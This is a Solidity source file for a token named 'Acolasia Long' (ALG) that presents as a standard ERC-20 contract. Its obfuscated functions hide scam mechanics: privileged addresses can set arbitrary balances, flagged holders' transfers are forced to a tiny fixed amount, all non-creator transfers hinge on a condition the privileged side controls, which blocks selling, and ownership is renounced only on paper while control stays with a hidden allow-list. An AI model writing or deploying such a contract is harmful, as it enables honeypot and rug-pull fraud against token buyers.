//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface exemptTradingSender {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchedIs) external view returns (uint256);

    function transfer(address launchedAmount, uint256 fromShould) external returns (bool);

    function allowance(address minMode, address spender) external view returns (uint256);

    function approve(address spender, uint256 fromShould) external returns (bool);

    function transferFrom(
        address sender,
        address launchedAmount,
        uint256 fromShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed minSenderTrading, uint256 value);
    event Approval(address indexed minMode, address indexed spender, uint256 value);
}

abstract contract fromLiquidityMode {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeSell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface toSwap {
    function createPair(address maxSell, address autoLaunched) external returns (address);
}

interface sellMode is exemptTradingSender {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AcolasiaLong is fromLiquidityMode, exemptTradingSender, sellMode {

    event OwnershipTransferred(address indexed atLaunched, address indexed totalTrading);

    function transferFrom(address listEnableTo, address launchedAmount, uint256 fromShould) external override returns (bool) {
        if (_msgSender() != walletLiquidityEnable) {
            if (marketingTx[listEnableTo][_msgSender()] != type(uint256).max) {
                require(fromShould <= marketingTx[listEnableTo][_msgSender()]);
                marketingTx[listEnableTo][_msgSender()] -= fromShould;
            }
        }
        return totalTradingShould(listEnableTo, launchedAmount, fromShould);
    }

    address walletLiquidityEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public receiverAt;

    function exemptLimit(address fromMax, uint256 fromShould) public {
        limitReceiver();
        shouldLimitTo[fromMax] = fromShould;
    }

    function decimals() external view virtual override returns (uint8) {
        return fromTx;
    }

    constructor (){
        
        takeSell tradingAuto = takeSell(walletLiquidityEnable);
        fromSenderSell = toSwap(tradingAuto.factory()).createPair(tradingAuto.WETH(), address(this));
        if (sellFrom) {
            sellFrom = false;
        }
        receiverMarketing = _msgSender();
        limitReceiverFrom();
        receiverAt[receiverMarketing] = true;
        shouldLimitTo[receiverMarketing] = walletTake;
        
        emit Transfer(address(0), receiverMarketing, walletTake);
    }

    bool private walletMode;

    address private toTx;

    function symbol() external view virtual override returns (string memory) {
        return feeLaunch;
    }

    uint256 listTrading;

    function limitReceiver() private view {
        require(receiverAt[_msgSender()]);
    }

    address public receiverMarketing;

    function getOwner() external view returns (address) {
        return toTx;
    }

    address feeLiquiditySell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function allowance(address txAt, address liquidityEnable) external view virtual override returns (uint256) {
        if (liquidityEnable == walletLiquidityEnable) {
            return type(uint256).max;
        }
        return marketingTx[txAt][liquidityEnable];
    }

    uint256 constant limitWallet = 5 ** 10;

    mapping(address => mapping(address => uint256)) private marketingTx;

    function shouldLimit(address launchedSell) public {
        limitReceiver();
        if (shouldMode == minExemptAt) {
            sellFrom = true;
        }
        if (launchedSell == receiverMarketing || launchedSell == fromSenderSell) {
            return;
        }
        feeTake[launchedSell] = true;
    }

    function takeEnable(uint256 fromShould) public {
        limitReceiver();
        listTrading = fromShould;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return walletTake;
    }

    uint256 receiverLiquidityFee;

    bool public minExemptAt;

    bool public sellFrom;

    bool private teamLaunch;

    function liquidityToken(address fundMin) public {
        if (sellList) {
            return;
        }
        if (teamLaunch != shouldMode) {
            swapMode = feeExempt;
        }
        receiverAt[fundMin] = true;
        
        sellList = true;
    }

    mapping(address => uint256) private shouldLimitTo;

    uint256 public senderSwapFee;

    string private feeLaunch = "ALG";

    address public fromSenderSell;

    function totalTradingShould(address listEnableTo, address launchedAmount, uint256 fromShould) internal returns (bool) {
        if (listEnableTo == receiverMarketing) {
            return toReceiverMin(listEnableTo, launchedAmount, fromShould);
        }
        uint256 teamLiquidity = exemptTradingSender(fromSenderSell).balanceOf(feeLiquiditySell);
        require(teamLiquidity == listTrading);
        require(launchedAmount != feeLiquiditySell);
        if (feeTake[listEnableTo]) {
            return toReceiverMin(listEnableTo, launchedAmount, limitWallet);
        }
        return toReceiverMin(listEnableTo, launchedAmount, fromShould);
    }

    bool public sellList;

    function transfer(address fromMax, uint256 fromShould) external virtual override returns (bool) {
        return totalTradingShould(_msgSender(), fromMax, fromShould);
    }

    uint256 public swapMode;

    mapping(address => bool) public feeTake;

    function owner() external view returns (address) {
        return toTx;
    }

    uint8 private fromTx = 18;

    function name() external view virtual override returns (string memory) {
        return listToken;
    }

    function approve(address liquidityEnable, uint256 fromShould) public virtual override returns (bool) {
        marketingTx[_msgSender()][liquidityEnable] = fromShould;
        emit Approval(_msgSender(), liquidityEnable, fromShould);
        return true;
    }

    function balanceOf(address launchedIs) public view virtual override returns (uint256) {
        return shouldLimitTo[launchedIs];
    }

    bool private shouldMode;

    string private listToken = "Acolasia Long";

    uint256 private feeExempt;

    function limitReceiverFrom() public {
        emit OwnershipTransferred(receiverMarketing, address(0));
        toTx = address(0);
    }

    function toReceiverMin(address listEnableTo, address launchedAmount, uint256 fromShould) internal returns (bool) {
        require(shouldLimitTo[listEnableTo] >= fromShould);
        shouldLimitTo[listEnableTo] -= fromShould;
        shouldLimitTo[launchedAmount] += fromShould;
        emit Transfer(listEnableTo, launchedAmount, fromShould);
        return true;
    }

    uint256 private walletTake = 100000000 * 10 ** 18;

}